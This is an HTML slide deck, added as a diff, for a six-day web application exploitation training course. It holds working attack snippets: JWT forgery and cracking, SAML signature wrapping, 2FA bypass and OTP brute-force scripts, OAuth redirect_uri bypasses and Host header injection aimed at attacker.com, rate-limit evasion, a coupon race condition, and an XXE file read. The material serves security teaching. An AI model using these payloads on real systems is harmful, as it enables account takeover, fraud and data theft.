@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Web Application Exploitation - Training</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/theme/black.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/highlight/monokai.css">
+    <style>
+        .reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
+        .reveal pre { width: 100%; box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.5); }
+        .reveal code { max-height: 500px; }
+        .reveal .diagram {
+            background: #1a1a1a;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 0.7em;
+            line-height: 1.2;
+        }
+        .reveal .attack-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .reveal .vulnerability {
+            background: #e74c3c;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: inline-block;
+            margin: 10px;
+        }
+        .reveal .success {
+            background: #27ae60;
+            padding: 10px 20px;
+            border-radius: 5px;
+            display: inline-block;
+        }
+        .reveal .columns {
+            display: flex;
+            gap: 20px;
+        }
+        .reveal .column {
+            flex: 1;
+        }
+        .highlight-red { color: #e74c3c; }
+        .highlight-green { color: #27ae60; }
+        .highlight-yellow { color: #f39c12; }
+        .highlight-blue { color: #3498db; }
+        .small-text { font-size: 0.7em; }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- TITLE SLIDE -->
+            <section data-background-gradient="linear-gradient(135deg, #667eea 0%, #764ba2 100%)">
+                <h1>🎯 Advanced Web Application Exploitation</h1>
+                <h3>6-Day Professional Training Program</h3>
+                <p>Master Modern Web Security Attack Techniques</p>
+                <p style="font-size: 0.6em; margin-top: 50px;">
+                    <strong>Topics:</strong> Authentication Bypass • API Security • XXE • RCE • Cryptography
+                </p>
+            </section>
+
+            <!-- COURSE OVERVIEW -->
+            <section>
+                <section>
+                    <h2>📚 Course Overview</h2>
+                    <div class="grid-2">
+                        <div class="attack-box">
+                            <h4>🎓 What You'll Master</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>JWT/OAuth/SAML Exploitation</li>
+                                <li>API Security Testing</li>
+                                <li>Business Logic Flaws</li>
+                                <li>Remote Code Execution</li>
+                            </ul>
+                        </div>
+                        <div class="attack-box">
+                            <h4>📊 Format</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>6 Days Intensive Training</li>
+                                <li>60% Hands-on Labs</li>
+                                <li>Real-world Scenarios</li>
+                                <li>Certification Exam</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>📅 6-Day Curriculum</h2>
+                    <table style="font-size: 0.7em;">
+                        <tr>
+                            <td><strong>Day 1</strong></td>
+                            <td>Introduction & Authentication Attacks</td>
+                            <td class="highlight-yellow">JWT, SAML, OAuth, 2FA</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Day 2</strong></td>
+                            <td>Password Reset & Business Logic</td>
+                            <td class="highlight-yellow">IDOR, Race Conditions</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Day 3</strong></td>
+                            <td>API Security & XXE</td>
+                            <td class="highlight-yellow">REST, GraphQL, XML</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Day 4</strong></td>
+                            <td>Cryptography & RCE</td>
+                            <td class="highlight-yellow">Deserialization, SSTI</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Day 5</strong></td>
+                            <td>Capstone Assessment</td>
+                            <td class="highlight-yellow">Full Attack Chain</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Day 6</strong></td>
+                            <td>Certification Exam</td>
+                            <td class="highlight-green">Certificate Earned</td>
+                        </tr>
+                    </table>
+                </section>
+            </section>
+
+            <!-- DAY 1 SECTION -->
+            <section data-background-gradient="linear-gradient(135deg, #f093fb 0%, #f5576c 100%)">
+                <h1>Day 1</h1>
+                <h2>Introduction & Authentication Attacks</h2>
+                <p class="highlight-yellow">5.5 hours • 2 Modules • 1 Capstone Drill</p>
+            </section>
+
+            <!-- WEB ARCHITECTURE -->
+            <section>
+                <section>
+                    <h2>🏗️ Web Application Architecture</h2>
+                    <pre class="diagram"><code class="plaintext">
+┌─────────────────────────────────────┐
+│      Client (Browser/Mobile)        │
+│   JavaScript / React / Angular      │
+└──────────────┬──────────────────────┘
+               │ HTTPS
+               ▼
+┌──────────────────────────────────────┐
+│     Load Balancer / CDN              │
+│   (Cloudflare, AWS CloudFront)       │
+└──────────────┬───────────────────────┘
+               │
+               ▼
+┌──────────────────────────────────────┐
+│     Web Application Firewall         │
+│   (ModSecurity, AWS WAF)             │
+└──────────────┬───────────────────────┘
+               │
+               ▼
+┌──────────────────────────────────────┐
+│     Application Server               │
+│  Node.js / Django / Spring Boot      │
+└──────────────┬───────────────────────┘
+               │
+               ▼
+┌──────────────────────────────────────┐
+│     Database / Cache                 │
+│  PostgreSQL / MongoDB / Redis        │
+└──────────────────────────────────────┘
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h2>🎯 Attack Surface Areas</h2>
+                    <div class="grid-2">
+                        <div>
+                            <div class="vulnerability">1. Client-side</div>
+                            <p class="small-text">XSS, CSRF, DOM attacks</p>
+
+                            <div class="vulnerability">2. Network Layer</div>
+                            <p class="small-text">SSL/TLS, MITM</p>
+
+                            <div class="vulnerability">3. Application Logic</div>
+                            <p class="small-text">Auth bypass, IDOR, Injection</p>
+                        </div>
+                        <div>
+                            <div class="vulnerability">4. API Layer</div>
+                            <p class="small-text">GraphQL, REST abuse</p>
+
+                            <div class="vulnerability">5. Infrastructure</div>
+                            <p class="small-text">Misconfigurations, exposed services</p>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- HTTP PROTOCOL -->
+            <section>
+                <section>
+                    <h2>🌐 HTTP Protocol Deep Dive</h2>
+                    <h4>HTTP Request Anatomy</h4>
+                    <pre><code class="http">POST /api/v1/login HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: application/json
+Content-Type: application/json
+Cookie: sessionid=abc123; _ga=GA1.2.123456789
+Authorization: Bearer eyJhbGc...
+
+{"username":"admin","password":"P@ssw0rd"}</code></pre>
+                </section>
+
+                <section>
+                    <h2>🔍 What to Analyze</h2>
+                    <div class="columns">
+                        <div class="column">
+                            <h4 class="highlight-blue">Headers</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Authorization</li>
+                                <li>Cookie</li>
+                                <li>Content-Type</li>
+                                <li>X-Custom headers</li>
+                            </ul>
+                        </div>
+                        <div class="column">
+                            <h4 class="highlight-blue">Parameters</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Query strings</li>
+                                <li>Path parameters</li>
+                                <li>Body parameters</li>
+                                <li>Hidden fields</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- JWT ATTACKS -->
+            <section>
+                <section>
+                    <h2>🔐 JWT Exploitation</h2>
+                    <h4>JWT Structure</h4>
+                    <pre><code class="javascript">// JWT = Header.Payload.Signature
+
+// Header (Base64)
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+// Payload (Base64)
+{
+  "user_id": 123,
+  "role": "user",
+  "exp": 1699999999
+}
+
+// Signature (HMAC)
+HMACSHA256(header + payload, secret)</code></pre>
+                </section>
+
+                <section>
+                    <h2>⚠️ JWT Attack Vectors</h2>
+                    <div class="grid-2">
+                        <div class="attack-box">
+                            <h4>1. "none" Algorithm</h4>
+                            <pre><code class="json">{
+  "alg": "none",
+  "typ": "JWT"
+}</code></pre>
+                            <p class="small-text">❌ Removes signature validation</p>
+                        </div>
+
+                        <div class="attack-box">
+                            <h4>2. Weak Secret</h4>
+                            <pre><code class="bash"># Crack with jwt_tool
+jwt_tool TOKEN -C \
+  -d wordlist.txt</code></pre>
+                            <p class="small-text">🔓 Brute-force weak keys</p>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>💣 Algorithm Confusion Attack</h2>
+                    <pre><code class="python"># RS256 → HS256 Confusion
+import jwt
+
+# 1. Get public key (often exposed)
+public_key = get_public_key()
+
+# 2. Create forged token using public key as HMAC secret
+payload = {
+    "user_id": 1,
+    "role": "admin",  # Privilege escalation!
+    "exp": 9999999999
+}
+
+# 3. Sign with public key as symmetric key
+forged_token = jwt.encode(
+    payload,
+    public_key,
+    algorithm="HS256"
+)
+
+# 4. Server validates with public key as HMAC secret ✓
+# Result: Authentication bypass!</code></pre>
+                </section>
+
+                <section>
+                    <h2>🛠️ JWT Exploitation Demo</h2>
+                    <pre><code class="bash"># Step 1: Capture JWT
+TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+# Step 2: Analyze with jwt_tool
+python3 jwt_tool.py $TOKEN
+
+# Step 3: Test all attacks
+python3 jwt_tool.py $TOKEN -M at
+
+# Step 4: Crack secret
+python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt
+
+# Step 5: Forge admin token
+python3 jwt_tool.py $TOKEN -T -pc role -pv admin</code></pre>
+                    <p class="highlight-green">✅ Admin access achieved!</p>
+                </section>
+            </section>
+
+            <!-- SAML ATTACKS -->
+            <section>
+                <section>
+                    <h2>🔑 SAML Exploitation</h2>
+                    <pre class="diagram"><code class="plaintext">SAML Flow:
+
+User → Service Provider (SP) → Identity Provider (IdP)
+  ↓         ↓                      ↓
+Login → Redirect to IdP → Authenticate
+  ↓         ↓                      ↓
+       ← SAML Response ←      Send Assertion
+  ↓         ↓
+     Validate & Grant Access
+
+⚠️ Attack Points:
+• Signature validation
+• Assertion wrapping
+• Token replay</code></pre>
+                </section>
+
+                <section>
+                    <h2>💥 SAML Attack: Signature Removal</h2>
+                    <pre><code class="xml">&lt;!-- Original SAML Response --&gt;
+&lt;samlp:Response&gt;
+  &lt;saml:Assertion&gt;
+    &lt;saml:Subject&gt;
+      &lt;saml:NameID&gt;user@example.com&lt;/saml:NameID&gt;
+    &lt;/saml:Subject&gt;
+    &lt;ds:Signature&gt;
+      &lt;!-- REMOVE THIS! --&gt;
+    &lt;/ds:Signature&gt;
+  &lt;/saml:Assertion&gt;
+&lt;/samlp:Response&gt;</code></pre>
+                    <div class="attack-box">
+                        <p>🎯 If server doesn't enforce signature → <span class="highlight-green">Bypass!</span></p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>🎭 SAML Signature Wrapping (XSW)</h2>
+                    <pre><code class="xml">&lt;samlp:Response&gt;
+  &lt;!-- Original signed assertion --&gt;
+  &lt;saml:Assertion ID="original"&gt;
+    &lt;saml:NameID&gt;attacker@example.com&lt;/saml:NameID&gt;
+    &lt;ds:Signature&gt;
+      &lt;!-- Valid signature ✓ --&gt;
+    &lt;/ds:Signature&gt;
+  &lt;/saml:Assertion&gt;
+
+  &lt;!-- Injected malicious assertion (unsigned) --&gt;
+  &lt;saml:Assertion ID="malicious"&gt;
+    &lt;saml:NameID&gt;admin@example.com&lt;/saml:NameID&gt;
+  &lt;/saml:Assertion&gt;
+&lt;/samlp:Response&gt;</code></pre>
+                    <p class="small-text">Parser may process <span class="highlight-red">second assertion</span> while validator checks <span class="highlight-green">first signature</span></p>
+                </section>
+            </section>
+
+            <!-- 2FA BYPASS -->
+            <section>
+                <section>
+                    <h2>🔓 Bypassing 2FA/MFA</h2>
+                    <h4>Common Implementation Flaws</h4>
+                    <div class="grid-2">
+                        <div class="vulnerability">
+                            <h5>Direct Access</h5>
+                            <p class="small-text">Skip 2FA verification step</p>
+                        </div>
+                        <div class="vulnerability">
+                            <h5>Response Manipulation</h5>
+                            <p class="small-text">Change false → true</p>
+                        </div>
+                        <div class="vulnerability">
+                            <h5>Rate Limiting</h5>
+                            <p class="small-text">Brute-force OTP codes</p>
+                        </div>
+                        <div class="vulnerability">
+                            <h5>Code Reuse</h5>
+                            <p class="small-text">Same OTP works multiple times</p>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>🎯 2FA Bypass: Direct Access</h2>
+                    <pre><code class="python">import requests
+
+session = requests.Session()
+
+# Step 1: Login (username + password)
+login = session.post('https://target.com/api/login',
+    json={'username': 'victim', 'password': 'pass123'})
+
+# Step 2: Skip 2FA verification
+# Try accessing protected resource directly
+dashboard = session.get('https://target.com/dashboard')
+
+if "Welcome" in dashboard.text:
+    print("✅ 2FA bypassed!")
+else:
+    print("❌ 2FA enforced")</code></pre>
+                </section>
+
+                <section>
+                    <h2>💣 2FA Bypass: Brute Force</h2>
+                    <pre><code class="python">import requests
+
+session = requests.Session()
+session.post('https://target.com/login',
+            json={'user': 'victim', 'pass': 'pass123'})
+
+# Brute-force 6-digit OTP (if no rate limiting)
+for code in range(1000000):
+    otp = f"{code:06d}"
+
+    response = session.post('https://target.com/verify-2fa',
+                           json={'code': otp})
+
+    if response.status_code == 200:
+        print(f"✅ Valid code: {otp}")
+        break</code></pre>
+                    <p class="highlight-red">⚠️ Only works without rate limiting!</p>
+                </section>
+            </section>
+
+            <!-- OAUTH ATTACKS -->
+            <section>
+                <section>
+                    <h2>🔐 OAuth 2.0 Attacks</h2>
+                    <pre class="diagram small-text"><code>OAuth Flow:
+
+1. User clicks "Login with Google"
+2. App redirects to OAuth provider
+3. User authorizes
+4. OAuth provider redirects back with code
+5. App exchanges code for access token
+6. User logged in
+
+⚠️ Attack Vectors:
+• Missing state parameter (CSRF)
+• Open redirect in redirect_uri
+• Authorization code leakage</code></pre>
+                </section>
+
+                <section>
+                    <h2>💥 OAuth Attack: Missing State</h2>
+                    <div class="attack-box">
+                        <h4>Attack Scenario</h4>
+                        <ol style="font-size: 0.8em; text-align: left;">
+                            <li>Attacker starts OAuth flow</li>
+                            <li>Captures callback URL with code</li>
+                            <li>Victim clicks attacker's link</li>
+                            <li>Victim's account linked to attacker's OAuth</li>
+                            <li>Attacker logs in via OAuth → Access victim account!</li>
+                        </ol>
+                    </div>
+                    <pre><code class="http">GET /oauth/authorize?
+  client_id=app&
+  redirect_uri=https://app.com/callback&
+  state=MISSING  ← No CSRF protection!</code></pre>
+                </section>
+
+                <section>
+                    <h2>🎯 OAuth Attack: redirect_uri Bypass</h2>
+                    <pre><code class="http">// Test these variations:
+
+// 1. Subdomain takeover
+redirect_uri=https://old.app.com/callback
+
+// 2. Domain confusion
+redirect_uri=https://app.com@attacker.com
+redirect_uri=https://app.com.attacker.com
+
+// 3. Open redirect
+redirect_uri=https://app.com/callback?next=https://evil.com
+
+// 4. Path traversal
+redirect_uri=https://app.com/callback/../../../evil.com</code></pre>
+                    <p class="highlight-yellow">🎯 Goal: Steal authorization code!</p>
+                </section>
+            </section>
+
+            <!-- DAY 2 SECTION -->
+            <section data-background-gradient="linear-gradient(135deg, #fa709a 0%, #fee140 100%)">
+                <h1>Day 2</h1>
+                <h2>Password Reset & Business Logic</h2>
+                <p class="highlight-yellow">5.5 hours • 2 Modules • 1 Red-Team Exercise</p>
+            </section>
+
+            <!-- PASSWORD RESET -->
+            <section>
+                <section>
+                    <h2>🔑 Password Reset Attacks</h2>
+                    <h4>Common Password Reset Flow</h4>
+                    <pre class="diagram"><code class="plaintext">1. User requests reset
+   ↓
+2. Server generates token
+   ↓
+3. Token sent via email
+   ↓
+4. User clicks link
+   ↓
+5. Server validates token
+   ↓
+6. User sets new password
+
+⚠️ Attack Points:
+• Token generation (predictability)
+• Host header manipulation
+• Rate limiting bypass
+• Token reuse</code></pre>
+                </section>
+
+                <section>
+                    <h2>💣 Host Header Injection</h2>
+                    <pre><code class="http">POST /password-reset HTTP/1.1
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+Content-Type: application/json
+
+{"email": "victim@example.com"}</code></pre>
+                    <div class="attack-box">
+                        <p>🎯 Reset link sent to victim:</p>
+                        <code>https://attacker.com/reset?token=SECRET</code>
+                        <p class="highlight-green">✅ Token captured when victim clicks!</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>🎭 Cookie Swap Attack</h2>
+                    <pre><code class="python"># Step 1: Attacker requests reset for victim
+POST /password-reset
+Cookie: session=attacker-session
+{"email": "victim@example.com"}
+
+# Server stores: reset_token=abc123 in attacker session
+
+# Step 2: Attacker obtains victim's session cookie
+# (via XSS, session fixation, etc.)
+
+# Step 3: Combine tokens
+GET /reset?token=abc123
+Cookie: session=victim-session
+
+# Step 4: Server associates reset with victim account
+# Attacker can now set victim's password!</code></pre>
+                </section>
+
+                <section>
+                    <h2>⚡ Rate Limiting Bypass</h2>
+                    <div class="grid-2">
+                        <div>
+                            <h4>Bypass Techniques</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>X-Forwarded-For rotation</li>
+                                <li>X-Real-IP spoofing</li>
+                                <li>User-Agent rotation</li>
+                                <li>Parameter pollution</li>
+                                <li>Race conditions</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <pre><code class="python">for i in range(1000):
+    headers = {
+        'X-Forwarded-For':
+        f'10.0.{i//256}.{i%256}'
+    }
+    requests.post(url,
+        headers=headers,
+        data=payload)</code></pre>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- BUSINESS LOGIC -->
+            <section>
+                <section>
+                    <h2>🧠 Business Logic Vulnerabilities</h2>
+                    <blockquote>
+                        "Application works as <span class="highlight-red">coded</span>,
+                        but not as <span class="highlight-green">intended</span>"
+                    </blockquote>
+                    <div class="grid-2">
+                        <div class="vulnerability">Price Manipulation</div>
+                        <div class="vulnerability">Race Conditions</div>
+                        <div class="vulnerability">IDOR</div>
+                        <div class="vulnerability">Mass Assignment</div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>💰 Mass Assignment Attack</h2>
+                    <div class="columns">
+                        <div class="column">
+                            <h4>Normal Request</h4>
+                            <pre><code class="json">{
+  "username": "alice",
+  "email": "alice@ex.com",
+  "password": "pass123"
+}</code></pre>
+                        </div>
+                        <div class="column">
+                            <h4>Malicious Request</h4>
+                            <pre><code class="json">{
+  "username": "attacker",
+  "email": "att@ex.com",
+  "password": "pass",
+  "is_admin": true,
+  "credits": 999999,
+  "role": "admin"
+}</code></pre>
+                        </div>
+                    </div>
+                    <p class="highlight-green">✅ Privilege escalation via parameter injection!</p>
+                </section>
+
+                <section>
+                    <h2>🎯 IDOR (Insecure Direct Object Reference)</h2>
+                    <pre><code class="bash"># Your own profile
+GET /api/users/1234/profile HTTP/1.1
+Authorization: Bearer your-token
+
+# Someone else's profile
+GET /api/users/5678/profile HTTP/1.1
+Authorization: Bearer your-token</code></pre>
+                    <div class="attack-box">
+                        <p>🎯 Test all endpoints with different IDs:</p>
+                        <ul style="font-size: 0.8em;">
+                            <li>/api/orders/{id}</li>
+                            <li>/api/documents/{id}</li>
+                            <li>/api/invoices/{id}</li>
+                            <li>/api/messages/{id}</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>⚡ Race Condition Exploitation</h2>
+                    <pre><code class="python">import concurrent.futures
+import requests
+
+session = requests.Session()
+
+def redeem_coupon():
+    return session.post('https://shop.com/redeem',
+                       json={'code': 'SAVE50'})
+
+# Send 50 parallel requests
+with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+    futures = [executor.submit(redeem_coupon)
+               for _ in range(50)]
+
+    results = [f.result() for f in futures]
+    success = sum(1 for r in results if r.status_code == 200)
+
+print(f"Redeemed coupon {success} times!")</code></pre>
+                    <p class="highlight-green">💰 $50 discount × 20 redemptions = $1000 saved!</p>
+                </section>
+            </section>
+
+            <!-- DAY 3 PREVIEW -->
+            <section>
+                <section data-background-gradient="linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)">
+                    <h1>Day 3 Preview</h1>
+                    <h2>API Security & XXE Attacks</h2>
+                </section>
+
+                <section>
+                    <h2>🔌 API Security Testing</h2>
+                    <div class="grid-2">
+                        <div class="attack-box">
+                            <h4>REST API</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>CRUD operations abuse</li>
+                                <li>HTTP method tampering</li>
+                                <li>API versioning exploitation</li>
+                                <li>Mass assignment</li>
+                            </ul>
+                        </div>
+                        <div class="attack-box">
+                            <h4>GraphQL</h4>
+                            <ul style="font-size: 0.8em;">
+                                <li>Introspection queries</li>
+                                <li>Batch query IDOR</li>
+                                <li>Deep nested DoS</li>
+                                <li>Field suggestions</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>💣 GraphQL Introspection</h2>
+                    <pre><code class="graphql">query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type { name }
+      }
+    }
+  }
+}</code></pre>
+                    <div class="success">
+                        ✅ Reveals entire API schema including hidden fields!
+                    </div>
+                </section>
+
+                <section>
+                    <h2>📄 XXE (XML External Entity)</h2>
+                    <pre><code class="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;user&gt;
+  &lt;username&gt;&xxe;&lt;/username&gt;
+&lt;/user&gt;</code></pre>
+                    <p class="highlight-red">💥 Read arbitrary files from server!</p>
+                </section>
+            </section>
+
+            <!-- LAB EXERCISES -->
+            <section>
+                <section>
+                    <h2>🧪 Lab Exercises Overview</h2>
+                    <table style="font-size: 0.6em;">
+                        <tr>
+                            <th>Lab</th>
+                            <th>Topic</th>
+                            <th>Objective</th>
+                        </tr>
+                        <tr>
+                            <td>Lab 1</td>
+                            <td>Burp Setup & Recon</td>
+                            <td>Configure tools, map application</td>
+                        </tr>
+                        <tr>
+                            <td>Lab 2</td>
+                            <td>JWT Exploitation</td>
+                            <td>Crack secret, forge admin token</td>
+                        </tr>
+                        <tr>
+                            <td>Lab 3</td>
+                            <td>Password Reset</td>
+                            <td>Host header injection, rate limit bypass</td>
+                        </tr>
+                        <tr>
+                            <td>Lab 4</td>
+                            <td>Race Conditions</td>
+                            <td>Redeem coupon multiple times</td>
+                        </tr>
+                        <tr>
+                            <td>Lab 5</td>
+                            <td>GraphQL/XXE</td>
+                            <td>Enumerate schema, read files</td>
+                        </tr>
+                        <tr>
+                            <td>Lab 6</td>
+                            <td>Deserialization</td>
+                            <td>Achieve RCE via PHP/Java deserialization</td>
+                        </tr>
+                        <tr>
+                            <td>Capstone</td>
+                            <td>Full Attack Chain</td>
+                            <td>Compromise application from recon to RCE</td>
+                        </tr>
+                    </table>
+                </section>
+
+                <section>
+                    <h2>🎯 Capstone Challenge</h2>
+                    <div class="attack-box">
+                        <h4>Scenario: Financial Services Portal</h4>
+                        <p style="font-size: 0.8em;">You have 4 hours to:</p>
+                        <ol style="font-size: 0.7em; text-align: left;">
+                            <li>Perform reconnaissance</li>
+                            <li>Find and exploit authentication bypass</li>
+                            <li>Escalate privileges to admin</li>
+                            <li>Access sensitive customer data</li>
+                            <li>Achieve remote code execution</li>
+                            <li>Document full attack chain</li>
+                            <li>Present findings professionally</li>
+                        </ol>
+                    </div>
+                </section>
+            </section>
+
+            <!-- TOOLS -->
+            <section>
+                <section>
+                    <h2>🛠️ Essential Tools</h2>
+                    <div class="grid-2">
+                        <div>
+                            <h4>Reconnaissance</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>subfinder</li>
+                                <li>amass</li>
+                                <li>ffuf</li>
+                                <li>gobuster</li>
+                                <li>nuclei</li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h4>Exploitation</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Burp Suite</li>
+                                <li>jwt_tool</li>
+                                <li>sqlmap</li>
+                                <li>ysoserial</li>
+                                <li>PHPGGC</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>🔥 Burp Suite Extensions</h2>
+                    <ul>
+                        <li class="highlight-yellow">JWT Editor</li>
+                        <li class="highlight-yellow">Autorize (Authorization testing)</li>
+                        <li class="highlight-yellow">Turbo Intruder (Race conditions)</li>
+                        <li class="highlight-yellow">SAML Raider</li>
+                        <li class="highlight-yellow">Param Miner</li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- CERTIFICATION -->
+            <section>
+                <section>
+                    <h2>🎓 Certification Exam</h2>
+                    <table style="font-size: 0.7em;">
+                        <tr>
+                            <th>Component</th>
+                            <th>Duration</th>
+                            <th>Weight</th>
+                        </tr>
+                        <tr>
+                            <td>Theory Exam</td>
+                            <td>25 min</td>
+                            <td>20%</td>
+                        </tr>
+                        <tr>
+                            <td>Practical A</td>
+                            <td>90 min</td>
+                            <td>35%</td>
+                        </tr>
+                        <tr>
+                            <td>Practical B</td>
+                            <td>75 min</td>
+                            <td>25%</td>
+                        </tr>
+                        <tr>
+                            <td>Capstone Defense</td>
+                            <td>40 min</td>
+                            <td>20%</td>
+                        </tr>
+                    </table>
+                    <p class="highlight-green" style="margin-top: 30px;">
+                        <strong>Passing Score: 70%</strong>
+                    </p>
+                </section>
+
+                <section>
+                    <h2>🏆 Certificate Earned</h2>
+                    <div class="attack-box" style="padding: 40px;">
+                        <h3>Advanced Web Application</h3>
+                        <h3>Exploitation Specialist</h3>
+                        <p style="margin-top: 30px;">✓ 48 CPE Credits</p>
+                        <p>✓ Digital Badge</p>
+                        <p>✓ LinkedIn Credential</p>
+                        <p>✓ Alumni Network Access</p>
+                    </div>
+                </section>
+            </section>
+
+            <!-- SUMMARY -->
+            <section>
+                <section>
+                    <h2>📊 Training Summary</h2>
+                    <div class="grid-2">
+                        <div class="attack-box">
+                            <h4>📚 You Will Master</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>50+ attack techniques</li>
+                                <li>8 hands-on labs</li>
+                                <li>Real-world scenarios</li>
+                                <li>Professional reporting</li>
+                            </ul>
+                        </div>
+                        <div class="attack-box">
+                            <h4>🎯 Career Impact</h4>
+                            <ul style="font-size: 0.7em;">
+                                <li>Penetration Tester</li>
+                                <li>Security Researcher</li>
+                                <li>Bug Bounty Hunter</li>
+                                <li>AppSec Engineer</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>🔐 Key Takeaways</h2>
+                    <div class="vulnerability" style="font-size: 1.2em; padding: 20px; margin: 20px;">
+                        Authentication is the #1 target
+                    </div>
+                    <div class="vulnerability" style="font-size: 1.2em; padding: 20px; margin: 20px;">
+                        Business logic > Technical vulnerabilities
+                    </div>
+                    <div class="vulnerability" style="font-size: 1.2em; padding: 20px; margin: 20px;">
+                        API security is critical
+                    </div>
+                    <div class="success" style="font-size: 1.2em; padding: 20px; margin: 20px;">
+                        Defense in depth is essential
+                    </div>
+                </section>
+            </section>
+
+            <!-- FINAL SLIDE -->
+            <section data-background-gradient="linear-gradient(135deg, #667eea 0%, #764ba2 100%)">
+                <h1>🎯 Ready to Begin?</h1>
+                <h3>Advanced Web Application Exploitation</h3>
+                <p style="font-size: 1.2em; margin-top: 50px;">
+                    Let's hack responsibly! 🚀
+                </p>
+                <p style="font-size: 0.8em; margin-top: 50px;">
+                    Questions? Let's get started!
+                </p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reveal.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/notes/notes.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/markdown/markdown.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/highlight/highlight.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: true,
+            transition: 'slide',
+            backgroundTransition: 'fade',
+            plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ],
+            width: 1280,
+            height: 720,
+            margin: 0.1,
+            minScale: 0.2,
+            maxScale: 2.0
+        });
+    </script>
+</body>
+</html>
